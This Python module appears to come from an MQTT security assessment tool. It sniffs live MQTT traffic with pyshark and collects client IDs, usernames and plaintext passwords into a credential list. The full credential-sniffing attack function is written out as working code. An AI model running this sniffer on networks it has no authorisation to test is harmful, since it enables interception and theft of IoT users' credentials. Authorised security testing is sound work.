import pyshark
import asyncio
import argparse

# Custom class to store a username and the related password (if found)
class Credentials:
    def __init__(self):
        # boolean flag used to check if the object is empty or not
        self.empty = True
        self.clientID = None
        self.username = None
        self.password = None

    def add_clientID(self, clientID):
        self.empty = False
        self.clientID = clientID
    def add_username(self, username):
        self.empty = False
        self.username = username
    def add_password(self, password):
        self.empty = False
        self.password = password

num_packets = 0
credential_list = []
username_set = {""}

# Utility functionto print credentials
def print_credentials(cred):
    cid = ("Any") if (cred.clientID == None or cred.clientID == "Client ID: ") else cred.clientID
    cusername = ("Any") if (cred.username == None) else cred.username
    cpassword = ("Any") if (cred.password == None) else cred.password
    return ("ID: "+cid+", "+ "U: "+cusername+", "+"P: "+cpassword)

# Utility function to convert the message type number in a more human-readable form
def convert_msg_type(msg_type):
    if (msg_type == 1):
        return "CONNECT"
    elif (msg_type == 2):
        return "CONNACK"
    elif (msg_type == 3):
        return "PUBLISH"
    elif (msg_type == 4):
        return "PUBACK"
    elif (msg_type == 5):
        return "PUBREQ"
    elif (msg_type == 6):
        return "PUBREL"
    elif (msg_type == 7):
        return "PUBCOMP"
    elif (msg_type == 8):
        return "SUBSCRIBE"
    elif (msg_type == 9):
        return "SUBACK"
    elif (msg_type == 10):
        return "UNSUBSCRIBE"
    elif (msg_type == 11):
        return "UNSUBACK"
    elif (msg_type == 12):
        return "PINGREQ"
    elif (msg_type == 13):
        return "PINGRESP"
    elif (msg_type == 14):
        return "DISCONNECT"

# Used for testing purposes to print specific parameters values for all the messages found in the communication
def print_info(pkt):
    global num_packets
    global credential_list
    global username_set
    
    print('')
    print(pkt['mqtt'].pretty_print())
        
    credential = Credentials()
    num_packets+=1
    
    try:
        print("Client ID: "+pkt['mqtt'].clientid)
        credential.add_clientID(pkt['mqtt'].clientid)
    except:
        print("No client id in the request")
    try:
        print("Username: "+pkt['mqtt'].username)
        credential.add_username(pkt['mqtt'].username)
    except:
        print("No username in the request")
    try:
        print("Password: "+pkt['mqtt'].passwd)
        credential.add_password(pkt['mqtt'].passwd)
    except:
        print("No password in the request")
    try:
        print("Message: "+pkt['mqtt'].msg)
    except:
        print("No message in the request")
    try:
        print("Topic: "+pkt['mqtt'].topic)
    except:
        print("No topic in the request")
    try:
        print("Msg type: "+convert_msg_type(int(pkt['mqtt'].msgtype)))
    except:
        print("No msg type in the request")
        
    # Add non-empty credentials and avoid duplicates (based on usernames)
    if (credential.empty == False):
        if (credential.username not in username_set):
            credential_list.append(credential)
            username_set.add(credential.username)

# Function called by MQTTSA (a subset of print_info)
def get_info(pkt):
    global num_packets
    global credential_list
    global username_set
    
    credential = Credentials()
    num_packets+=1
    
    # Try to get the client-id, username and password from the intercepted message
    try:
        credential.add_clientID(pkt['mqtt'].clientid)
    except:
        pass
    try:
        credential.add_username(pkt['mqtt'].username)
    except:
        pass
    try:
        credential.add_password(pkt['mqtt'].passwd)
    except:
        pass

    # Add non-empty credentials and avoid duplicates (based on usernames)
    if (credential.empty == False):
        if (credential.username not in username_set):
            credential_list.append(credential)
            username_set.add(credential.username)

def sniffing_attack(interface, listening_time, port):
    global num_packets
    # It use pyshark to sniff over the specified interface; the mqtt filter allows to intercept only MQTT messages
    cap = pyshark.LiveCapture(interface=interface, display_filter='mqtt', decode_as={"tcp.port=="+str(port)+"": "mqtt"})
    try:
        # Sniff for listening_time (then raise an exception) and use get_info to extract credentials
        cap.apply_on_packets(get_info, timeout=float(listening_time))

    except asyncio.exceptions.TimeoutError:
        print("Sniffing terminated: "+str(num_packets)+" packets intercepted on "+interface)
        pass
    except Exception as e:
        template = "An exception of type {0} occurred during Sniffing. Arguments:\n{1!r}"
        message = template.format(type(e).__name__, e.args)
        print(message)
    
    return credential_list

# used for running only this attack for testing purposes
if __name__=="__main__":
    # parse args
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument(metavar='*interface*', type=str, dest='inf', help='Specify the local interface for sniffing')
    parser.add_argument('-t', type=int, dest = 'time', default=30, help='Specify the sniffing duration in seconds (defaults to 30)')
    parser.add_argument('-p', type=int, dest = 'port', default=1883, help='Specify the broker port to correctly parse packets (defaults to 1883)')
    args = parser.parse_args()
    
    print("\nIntercepting for "+ str(args.time) +" seconds on interface "+ str(args.inf) +" (port "+ str(args.port) +") - exit anytime with ctrl+c\n")
    cap = pyshark.LiveCapture(interface=args.inf, display_filter='mqtt', decode_as={"tcp.port=="+str(args.port)+"": "mqtt"})
    
    try:
        cap.apply_on_packets(print_info, timeout=float(args.time))
    except asyncio.exceptions.TimeoutError:
        print("\nSniffing terminated: "+str(num_packets)+" packets intercepted on "+args.inf)
    except Exception as e:
        print(type(e))
        template = "An exception of type {0} occurred during Sniffing. Arguments:\n{1!r}"
        message = template.format(type(e).__name__, e.args)
        print(message)

    for c in credential_list:
            print(print_credentials(c))